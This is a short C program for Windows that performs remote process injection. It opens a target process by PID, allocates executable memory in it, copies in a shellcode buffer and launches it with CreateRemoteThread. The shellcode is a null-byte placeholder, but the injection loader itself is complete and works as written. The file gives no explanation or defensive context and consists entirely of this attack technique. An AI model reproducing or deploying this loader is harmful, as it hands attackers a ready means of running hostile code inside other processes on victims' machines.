#include <Windows.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

	if (argc != 2)
	{
		printf("Usage: %s <pid>\n", argv[0]);
		exit(0);
	}

	int pid = atoi(argv[1]);

	LPVOID base_address;

	HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (process_handle == NULL)
	{
		printf("OpenProcess failed: %d\n", GetLastError());
		exit(0);
	}
	else 
	{
		printf("OpenProcess succeeded: %p\n", process_handle);
		base_address = VirtualAllocEx(process_handle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (base_address==NULL)
		{
			printf("VirtualAllocEx failed: %d\n", GetLastError());
			exit(0);
		}
		else
		{
			printf("VirtualAllocEx succeeded: %p\n", base_address);
			if (WriteProcessMemory(process_handle, base_address, shellcode, sizeof(shellcode), NULL) == FALSE)
			{
				printf("WriteProcessMemory failed: %d\n", GetLastError());
				exit(0);
			}
			else
			{
				printf("WriteProcessMemory succeeded\n");
				if (CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)base_address, NULL, 0, NULL) == NULL)
				{
					printf("CreateRemoteThread failed: %d\n", GetLastError());
					exit(0);
				}
				else
				{
					printf("CreateRemoteThread succeeded\n");
				}
			}
		}
	}
}